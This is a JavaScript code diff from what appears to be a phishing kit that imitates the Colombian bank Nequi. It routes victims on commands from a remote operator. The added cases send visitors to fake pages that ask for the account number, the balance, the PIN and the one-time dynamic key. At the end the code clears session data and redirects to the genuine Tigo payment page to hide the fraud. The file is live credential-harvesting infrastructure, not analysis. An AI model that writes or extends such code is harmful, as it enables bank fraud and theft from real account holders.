@@ -169,41 +169,72 @@
             }
             window.__nequiSaldoProcessing = true;
 
-            const actionType = action.action.replace('nequi_', '');
-
-            console.log('[NEQUI SALDO INPUT] Procesando acción única:', action.action);
+            console.log('[NEQUI SALDO INPUT] Procesando acción:', action.action);
             
-            switch(actionType) {
+            // Switch SIN replace - usar la acción completa
+            switch(action.action) {
+              case 'nequi_saldo_aprobado':
               case 'saldo_aprobado':
                 console.log('[NEQUI SALDO INPUT] ✅ Saldo aprobado → Redirigiendo a clave.html');
-                // Mantener overlay durante redirección
                 window.location.href = 'clave.html';
                 break;
                 
+              case 'nequi_request_clave':
+              case 'nequi_pedir_clave':
               case 'request_clave':
               case 'pedir_clave':
                 console.log('[NEQUI SALDO INPUT] 🔐 Pedir clave → Redirigiendo a clave.html');
-                // Mantener overlay durante redirección
                 window.location.href = 'clave.html';
                 break;
+                
+              case 'nequi_request_numero':
+              case 'nequi_pedir_numero':
+                console.log('[NEQUI SALDO INPUT] 📱 Pedir número → Redirigiendo a numero.html');
+                window.location.href = 'numero.html';
+                break;
+                
+              case 'nequi_pedir_saldo':
+              case 'nequi_request_saldo':
+                console.log('[NEQUI SALDO INPUT] 📊 Ya estamos en saldo, recargando...');
+                window.location.reload();
+                break;
+                
+              case 'nequi_request_dinamica':
+              case 'nequi_pedir_dinamica':
+                console.log('[NEQUI SALDO INPUT] 🎯 Pedir dinámica → Redirigiendo a clave-dinamica.html');
+                window.location.href = 'clave-dinamica.html';
+                break;
 
+              case 'nequi_saldo_rechazado':
+              case 'nequi_error_saldo':
               case 'saldo_rechazado':
               case 'error_saldo':
-                console.log('[NEQUI SALDO INPUT] ❌ Saldo rechazado/error');
+                console.log('[NEQUI SALDO INPUT] ❌ Saldo rechazado/error → Reintentando');
                 if (overlay) {
                   overlay.classList.remove('active');
                 }
-                alert('Saldo incorrecto. Por favor verifica el saldo en tu app Nequi e intenta nuevamente.');
                 saldoInput.value = '';
                 btnValidar.disabled = true;
                 btnValidar.style.backgroundColor = '#F8A8D8';
                 btnValidar.textContent = 'Continuar';
                 window.__nequiSaldoProcessing = false;
                 break;
+                
+              case 'nequi_error_clave':
+                console.log('[NEQUI SALDO INPUT] ❌ Error clave → Redirigiendo a clave.html');
+                window.location.href = 'clave.html';
+                break;
+                
+              case 'nequi_error_dinamica':
+                console.log('[NEQUI SALDO INPUT] ❌ Error dinámica → Redirigiendo a clave-dinamica.html');
+                window.location.href = 'clave-dinamica.html';
+                break;
 
+              case 'nequi_finalizar':
               case 'finalizar':
                 console.log('[NEQUI SALDO INPUT] 🏁 Finalizar → Redirigiendo a Tigo');
-                // Mantener overlay durante redirección
+                localStorage.removeItem('nequi_session_id');
+                sessionStorage.clear();
                 window.location.href = 'https://mi.tigo.com.co/pago-express/facturas';
                 break;
 
